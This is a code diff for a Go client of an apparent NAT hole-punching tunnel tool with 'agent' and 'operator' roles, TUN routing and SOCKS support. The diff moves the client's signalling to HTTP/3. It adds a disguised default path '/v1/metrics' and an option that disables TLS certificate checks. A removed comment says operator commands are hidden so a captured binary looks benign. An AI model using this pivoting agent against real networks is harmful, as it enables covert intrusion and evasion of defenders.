@@ -3,13 +3,17 @@ package main
 
 import (
 	"bufio"
+	"context"
 	"crypto/ed25519"
+	"crypto/tls"
 	"encoding/binary"
 	"encoding/hex"
 	"flag"
 	"fmt"
+	"io"
 	"log"
 	"net"
+	"net/http"
 	"os"
 	"os/exec"
 	"os/signal"
@@ -20,6 +24,9 @@ import (
 	"syscall"
 	"time"
 
+	"github.com/quic-go/quic-go"
+	"github.com/quic-go/quic-go/http3"
+
 	"github.com/abb3rrant/HolePunch/pkg/auth"
 	"github.com/abb3rrant/HolePunch/pkg/config"
 	"github.com/abb3rrant/HolePunch/pkg/holepunch"
@@ -28,35 +35,51 @@ import (
 )
 
 type Client struct {
-	conn         *net.UDPConn
-	serverAddr   *net.UDPAddr
-	clientID     [32]byte
-	keys         *holepunch.KeyPair
-	puncher      *holepunch.Puncher
-	peers        map[string]*PeerEntry
-	peersMu      sync.RWMutex
+	// Transport layer. conn is the raw UDP socket shared by QUIC (for the
+	// server signalling channel) and the hole puncher (for peer traffic).
+	// quic.Transport.ReadNonQUICPacket surfaces peer packets that arrive on
+	// the same UDP port as the QUIC connection to the server.
+	conn net.PacketConn
+	qt   *quic.Transport
+
+	// Server signalling channel.  serverPipe is the write end of the POST
+	// body piped to the server; serverResp is the server's response body.
+	serverPipe *io.PipeWriter
+	serverResp io.ReadCloser
+	serverMu   sync.Mutex // serialises writes to serverPipe
+
+	// Connection lifecycle.
+	ctx          context.Context
+	cancelCtx    context.CancelFunc
 	shutdown     chan struct{}
+	shutdownOnce sync.Once
+
+	serverAddr string
+	agentPath  string
+	ignoreCert bool
+
+	clientID [32]byte
+	keys     *holepunch.KeyPair
+	puncher  *holepunch.Puncher
+
+	peers   map[string]*PeerEntry
+	peersMu sync.RWMutex
+
 	proxyManager *proxy.Manager
 	stats        *config.Stats
 	startTime    time.Time
 
-	// Operator auth. edPrivKey is nil when no -key was passed; in that case
-	// the client runs as a passive agent and operator commands are gated off
-	// in the interactive shell. sessionNonce arrives in RegisterAck and is
-	// only read/written from the single receiveLoop goroutine.
+	// Operator auth. edPrivKey is nil when no -key was passed.
 	edPrivKey    ed25519.PrivateKey
 	sessionNonce [32]byte
 
-	// Tunnel state — guarded by stateMu where multi-goroutine access matters.
-	// Most writes happen on the interactive command goroutine; reads from
-	// tunReadLoop / tunWritePacket take the mutex. isOperator also lives here
-	// so the role check is atomic against AuthResult arrival.
+	// Tunnel state.
 	stateMu       sync.RWMutex
 	session       *PeerEntry
 	tunnelStarted bool
 	tunnelIface   string
 	tunnelRoutes  []string
-	tunFile       *os.File // TUN device file descriptor
+	tunFile       *os.File
 	isOperator    bool
 }
 
@@ -67,73 +90,137 @@ type PeerEntry struct {
 	Connected bool
 }
 
-// NewClient builds a client. edPrivKey is the operator Ed25519 private key
-// loaded from disk via -key; pass nil to run as a passive agent (no operator
-// commands available, no auth attempted).
-func NewClient(serverAddr string, useIPv6 bool, edPrivKey ed25519.PrivateKey) (*Client, error) {
+func NewClient(serverAddr, agentPath string, useIPv6 bool, edPrivKey ed25519.PrivateKey, ignoreCert bool) (*Client, error) {
 	network := "udp4"
 	if useIPv6 {
 		network = "udp6"
 	}
 
-	server, err := net.ResolveUDPAddr(network, serverAddr)
-	if err != nil {
-		return nil, fmt.Errorf("failed to resolve server: %w", err)
-	}
-
-	conn, err := net.ListenUDP(network, &net.UDPAddr{Port: 0})
+	udpConn, err := net.ListenUDP(network, &net.UDPAddr{Port: 0})
 	if err != nil {
 		return nil, fmt.Errorf("failed to create socket: %w", err)
 	}
 
 	clientID, err := holepunch.GenerateClientID()
 	if err != nil {
+		udpConn.Close()
 		return nil, fmt.Errorf("failed to generate ID: %w", err)
 	}
 
 	keys, err := holepunch.GenerateKeyPair()
 	if err != nil {
+		udpConn.Close()
 		return nil, fmt.Errorf("failed to generate keys: %w", err)
 	}
 
-	client := &Client{
-		conn:       conn,
-		serverAddr: server,
+	ctx, cancelCtx := context.WithCancel(context.Background())
+
+	c := &Client{
+		conn:       udpConn,
+		qt:         &quic.Transport{Conn: udpConn},
+		ctx:        ctx,
+		cancelCtx:  cancelCtx,
+		shutdown:   make(chan struct{}),
+		serverAddr: serverAddr,
+		agentPath:  agentPath,
+		ignoreCert: ignoreCert,
 		clientID:   clientID,
 		keys:       keys,
 		peers:      make(map[string]*PeerEntry),
-		shutdown:   make(chan struct{}),
 		stats:      config.NewStats(),
 		startTime:  time.Now(),
 		edPrivKey:  edPrivKey,
 	}
 
-	client.puncher = holepunch.NewPuncher(conn, keys)
-	client.puncher.SetDataHandler(client.onDataReceived)
-	client.puncher.SetPeerConnectedHandler(client.onPeerConnected)
-	// Wrap SendToPeer so proxy traffic is counted in client stats.
+	c.puncher = holepunch.NewPuncher(udpConn, keys)
+	c.puncher.SetDataHandler(c.onDataReceived)
+	c.puncher.SetPeerConnectedHandler(c.onPeerConnected)
+
 	sendFunc := func(peerID [32]byte, data []byte) error {
-		err := client.puncher.SendToPeer(peerID, data)
+		err := c.puncher.SendToPeer(peerID, data)
 		if err == nil {
-			client.stats.AddBytesSent(uint64(len(data)))
-			client.stats.AddPacketsSent(1)
+			c.stats.AddBytesSent(uint64(len(data)))
+			c.stats.AddPacketsSent(1)
 		}
 		return err
 	}
-	client.proxyManager = proxy.NewManager(sendFunc)
+	c.proxyManager = proxy.NewManager(sendFunc)
 
-	return client, nil
+	return c, nil
+}
+
+// connect dials the HTTP/3 signalling channel to the server.
+// The underlying UDP socket is shared with the puncher, so the QUIC source
+// port IS the hole-punch port the server records and shares with peers.
+func (c *Client) connect() error {
+	// Normalise server address to host:port.
+	serverAddr := c.serverAddr
+	if !strings.Contains(serverAddr, ":") {
+		serverAddr += ":443"
+	}
+	serverURL := "https://" + serverAddr + c.agentPath
+
+	tlsConf := &tls.Config{
+		InsecureSkipVerify: c.ignoreCert, //nolint:gosec — intentional for self-signed mode
+		NextProtos:         []string{"h3"},
+	}
+
+	qt := c.qt
+	rt := &http3.Transport{
+		TLSClientConfig: tlsConf,
+		Dial: func(ctx context.Context, addr string, tlsCfg *tls.Config, cfg *quic.Config) (*quic.Conn, error) {
+			udpAddr, err := net.ResolveUDPAddr("udp", addr)
+			if err != nil {
+				return nil, err
+			}
+			return qt.DialEarly(ctx, udpAddr, tlsCfg, cfg)
+		},
+	}
+
+	pr, pw := io.Pipe()
+	req, err := http.NewRequestWithContext(c.ctx, "POST", serverURL, pr)
+	if err != nil {
+		pr.Close()
+		pw.Close()
+		return err
+	}
+	req.Header.Set("Content-Type", "application/octet-stream")
+
+	resp, err := rt.RoundTrip(req)
+	if err != nil {
+		pr.Close()
+		pw.Close()
+		return err
+	}
+
+	c.serverPipe = pw
+	c.serverResp = resp.Body
+	return nil
+}
+
+// sendToServer writes one complete protocol message to the server stream.
+func (c *Client) sendToServer(data []byte) {
+	c.serverMu.Lock()
+	defer c.serverMu.Unlock()
+	if c.serverPipe != nil {
+		c.serverPipe.Write(data) //nolint:errcheck
+	}
 }
 
 func (c *Client) Run() error {
 	log.Printf("Client ID: %s", hex.EncodeToString(c.clientID[:8]))
-	log.Printf("Connecting to: %s", c.serverAddr.String())
+	log.Printf("Connecting to: %s", c.serverAddr)
+
+	if err := c.connect(); err != nil {
+		return fmt.Errorf("connect: %w", err)
+	}
 
 	if err := c.register(); err != nil {
 		return fmt.Errorf("register failed: %w", err)
 	}
 
-	go c.receiveLoop()
+	go c.serverReceiveLoop()
+	go c.peerReceiveLoop()
 	go c.keepaliveLoop()
 	go c.interactiveMode()
 
@@ -143,37 +230,79 @@ func (c *Client) Run() error {
 
 func (c *Client) register() error {
 	msg := &protocol.RegisterMessage{ClientID: c.clientID, PublicKey: c.keys.PublicKey}
-	_, err := c.conn.WriteToUDP(msg.Serialize(), c.serverAddr)
-	return err
+	c.sendToServer(msg.Serialize())
+	return nil
 }
 
-func (c *Client) receiveLoop() {
+// serverReceiveLoop reads framed messages from the HTTP/3 response body.
+func (c *Client) serverReceiveLoop() {
+	for {
+		data, err := readMsg(c.serverResp)
+		if err != nil {
+			select {
+			case <-c.shutdown:
+			default:
+				log.Printf("Server connection closed: %v", err)
+				c.Shutdown()
+			}
+			return
+		}
+		c.stats.AddBytesReceived(uint64(len(data)))
+		c.stats.AddPacketsReceived(1)
+		c.handleServerMessage(data)
+	}
+}
+
+// peerReceiveLoop reads raw (non-QUIC) UDP packets that arrive on the shared
+// socket — these are encrypted hole-punch / data packets from peers.
+func (c *Client) peerReceiveLoop() {
 	buf := make([]byte, 65535)
 	for {
-		select {
-		case <-c.shutdown:
+		n, addr, err := c.qt.ReadNonQUICPacket(c.ctx, buf)
+		if err != nil {
+			select {
+			case <-c.shutdown:
+			default:
+				log.Printf("Peer read error: %v", err)
+			}
 			return
-		default:
 		}
 
-		c.conn.SetReadDeadline(time.Now().Add(1 * time.Second))
-		n, addr, err := c.conn.ReadFromUDP(buf)
-		if err != nil {
+		udpAddr, ok := addr.(*net.UDPAddr)
+		if !ok {
 			continue
 		}
 
 		c.stats.AddBytesReceived(uint64(n))
 		c.stats.AddPacketsReceived(1)
 
-		if addr.IP.Equal(c.serverAddr.IP) && addr.Port == c.serverAddr.Port {
-			c.handleServerPacket(buf[:n])
-		} else {
-			c.puncher.HandlePacket(buf[:n], addr)
-		}
+		pkt := make([]byte, n)
+		copy(pkt, buf[:n])
+		c.puncher.HandlePacket(pkt, udpAddr)
 	}
 }
 
-func (c *Client) handleServerPacket(data []byte) {
+// readMsg reads one length-framed protocol message from r.
+func readMsg(r io.Reader) ([]byte, error) {
+	hdr := make([]byte, protocol.HeaderSize)
+	if _, err := io.ReadFull(r, hdr); err != nil {
+		return nil, err
+	}
+	h, err := protocol.ParseHeader(hdr)
+	if err != nil {
+		return nil, err
+	}
+	if h.Length == 0 {
+		return hdr, nil
+	}
+	payload := make([]byte, h.Length)
+	if _, err := io.ReadFull(r, payload); err != nil {
+		return nil, err
+	}
+	return append(hdr, payload...), nil
+}
+
+func (c *Client) handleServerMessage(data []byte) {
 	if len(data) < protocol.HeaderSize {
 		return
 	}
@@ -226,29 +355,21 @@ func (c *Client) handleServerPacket(data []byte) {
 	}
 }
 
-// sendAuthRequest signs the server-provided session nonce and our clientID
-// with our Ed25519 private key, then ships the request. Called from the
-// receiveLoop goroutine right after we process RegisterAck.
 func (c *Client) sendAuthRequest() {
 	var pub [auth.PublicKeySize]byte
 	copy(pub[:], c.edPrivKey.Public().(ed25519.PublicKey))
 
 	sig := auth.Sign(c.edPrivKey, c.sessionNonce, c.clientID)
 	msg := &protocol.AuthRequestMessage{PublicKey: pub, Signature: sig}
-	c.conn.WriteToUDP(msg.Serialize(), c.serverAddr)
+	c.sendToServer(msg.Serialize())
 }
 
-// operatorRole reports whether the server granted us operator role. Safe to
-// call from any goroutine.
 func (c *Client) operatorRole() bool {
 	c.stateMu.RLock()
 	defer c.stateMu.RUnlock()
 	return c.isOperator
 }
 
-// requireOperator gates an operator-only command. Prints a one-line refusal
-// (using cmd as the verb) and returns false when the client is not yet
-// authenticated.
 func (c *Client) requireOperator(cmd string) bool {
 	if c.operatorRole() {
 		return true
@@ -290,8 +411,6 @@ func (c *Client) handlePeerList(data []byte) {
 			break
 		}
 
-		// Copy IP bytes out of the receive buffer so peer.Addr.IP stays
-		// valid after the buffer is reused for the next UDP read.
 		ipCopy := make(net.IP, ipLen)
 		copy(ipCopy, data[offset:offset+ipLen])
 		peer.Addr = &net.UDPAddr{
@@ -356,7 +475,6 @@ func (c *Client) onPeerConnected(peerID [32]byte) {
 }
 
 func (c *Client) keepaliveLoop() {
-	// : 25 second persistent keepalive
 	ticker := time.NewTicker(holepunch.KeepaliveTimeout)
 	defer ticker.Stop()
 
@@ -368,7 +486,7 @@ func (c *Client) keepaliveLoop() {
 		case <-c.shutdown:
 			return
 		case <-ticker.C:
-			c.conn.WriteToUDP(keepaliveData, c.serverAddr)
+			c.sendToServer(keepaliveData)
 			c.puncher.SendKeepalive()
 		}
 	}
@@ -378,8 +496,6 @@ func (c *Client) interactiveMode() {
 	scanner := bufio.NewScanner(os.Stdin)
 	c.printBanner()
 
-	// Only show the prompt when stdin is a TTY; piped/scripted use stays
-	// clean (no prompt clutter in log captures).
 	tty := config.StdinIsTTY()
 
 	if tty {
@@ -458,9 +574,6 @@ func (c *Client) printBanner() {
 
 func (c *Client) printHelp() {
 	if !c.operatorRole() {
-		// Agent mode: hide operator commands entirely. A captured binary's
-		// help output should look benign — no hints about what it could do
-		// with an operator key.
 		fmt.Print(`
 Commands:
   stats                       - Show connection statistics
@@ -585,7 +698,7 @@ func (c *Client) cmdSession(args []string) {
 		header := protocol.Header{Version: protocol.WireVersion, Type: protocol.MsgTypePunchRequest, Length: 32}
 		msg := header.Serialize()
 		msg = append(msg, target.ID[:]...)
-		c.conn.WriteToUDP(msg, c.serverAddr)
+		c.sendToServer(msg)
 		fmt.Println("Connecting...")
 		time.Sleep(2 * time.Second)
 
@@ -650,17 +763,13 @@ func (c *Client) startTunnel() {
 	iface := c.tunnelIface
 	c.stateMu.Unlock()
 
-	// Set up callback for writing response packets back to TUN
 	c.proxyManager.SetTUNWriter(c.tunWritePacket)
-
-	// Start reading packets from TUN and forwarding
 	go c.tunReadLoop()
 
 	fmt.Printf("Tunnel %s is up\n", iface)
 	fmt.Println("Add routes: route add <cidr>")
 }
 
-// tunReadLoop reads packets from TUN and forwards via proxy ()
 func (c *Client) tunReadLoop() {
 	c.stateMu.RLock()
 	tunFile := c.tunFile
@@ -693,14 +802,12 @@ func (c *Client) tunReadLoop() {
 			continue
 		}
 
-		// Parse IP header
 		ipPacket := buf[:n]
 		version := ipPacket[0] >> 4
 		if version != 4 {
-			continue // IPv4 only for now
+			continue
 		}
 
-		// cryptokey routing: lookup peer by destination IP
 		dstIP := net.IP(ipPacket[16:20])
 		peer, found := c.puncher.LookupPeerByIP(dstIP)
 
@@ -718,7 +825,6 @@ func (c *Client) tunReadLoop() {
 			}
 		}
 
-		// Forward the entire IP packet to the peer
 		ipCopy := make([]byte, n)
 		copy(ipCopy, ipPacket)
 
@@ -728,7 +834,6 @@ func (c *Client) tunReadLoop() {
 	}
 }
 
-// tunWritePacket writes an IP packet to the TUN interface
 func (c *Client) tunWritePacket(ipPacket []byte) {
 	c.stateMu.RLock()
 	tunFile := c.tunFile
@@ -820,7 +925,6 @@ func (c *Client) addRoute(cidr string) {
 		return
 	}
 
-	// : add AllowedIP for cryptokey routing
 	if err := c.puncher.AddAllowedIP(c.session.ID, *ipnet); err != nil {
 		fmt.Printf("Failed to add allowed IP: %v\n", err)
 		return
@@ -848,7 +952,6 @@ func (c *Client) addRoute(cidr string) {
 func (c *Client) delRoute(cidr string) {
 	_, ipnet, _ := net.ParseCIDR(cidr)
 
-	// : remove AllowedIP
 	if c.session != nil && ipnet != nil {
 		c.puncher.RemoveAllowedIP(c.session.ID, *ipnet)
 	}
@@ -1084,21 +1187,26 @@ func (c *Client) cmdSocks(args []string) {
 }
 
 func (c *Client) Shutdown() {
-	if c.tunnelStarted {
-		c.stopTunnel()
-	}
-	if c.proxyManager != nil {
-		c.proxyManager.Close()
-	}
-	header := protocol.Header{Version: protocol.WireVersion, Type: protocol.MsgTypeDisconnect, Length: 0}
-	c.conn.WriteToUDP(header.Serialize(), c.serverAddr)
-	close(c.shutdown)
-	c.conn.Close()
+	c.shutdownOnce.Do(func() {
+		if c.tunnelStarted {
+			c.stopTunnel()
+		}
+		if c.proxyManager != nil {
+			c.proxyManager.Close()
+		}
+		disconn := protocol.Header{Version: protocol.WireVersion, Type: protocol.MsgTypeDisconnect, Length: 0}
+		c.sendToServer(disconn.Serialize())
+		c.serverMu.Lock()
+		if c.serverPipe != nil {
+			c.serverPipe.Close()
+		}
+		c.serverMu.Unlock()
+		c.cancelCtx()
+		close(c.shutdown)
+		c.conn.Close()
+	})
 }
 
-// runKeygen generates an Ed25519 operator keypair at path (private) and
-// path+".pub" (public, authorized_keys-line format). Refuses to overwrite
-// existing files — losing a key silently is far worse than a one-line error.
 func runKeygen(path string) error {
 	for _, p := range []string{path, path + ".pub"} {
 		if _, err := os.Stat(p); err == nil {
@@ -1139,10 +1247,12 @@ func runKeygen(path string) error {
 }
 
 func main() {
-	serverAddr := flag.String("server", "localhost:41234", "Server address")
+	serverAddr := flag.String("server", fmt.Sprintf("localhost:%d", config.DefaultServerPort), "Server address (host:port)")
+	agentPath := flag.String("agent-path", "/v1/metrics", "HTTP path for agent connection (must match server -agent-path)")
 	ipv6 := flag.Bool("6", false, "Use IPv6")
-	keyPath := flag.String("key", "", "Path to Ed25519 operator private key (32-byte seed). Without this, runs as a passive agent.")
-	keygenPath := flag.String("keygen", "", "Generate Ed25519 operator keypair at <path> (writes <path> and <path>.pub) and exit.")
+	keyPath := flag.String("key", "", "Path to Ed25519 operator private key. Without this, runs as a passive agent.")
+	keygenPath := flag.String("keygen", "", "Generate Ed25519 operator keypair at <path> and exit.")
+	ignoreCert := flag.Bool("ignorecert", false, "Skip TLS certificate verification (required when server uses -tls-mode self)")
 	showVersion := flag.Bool("version", false, "Show version and exit")
 	flag.Parse()
 
@@ -1167,7 +1277,7 @@ func main() {
 		edPriv = k
 	}
 
-	client, err := NewClient(*serverAddr, *ipv6, edPriv)
+	client, err := NewClient(*serverAddr, *agentPath, *ipv6, edPriv, *ignoreCert)
 	if err != nil {
 		log.Fatalf("Failed: %v", err)
 	}
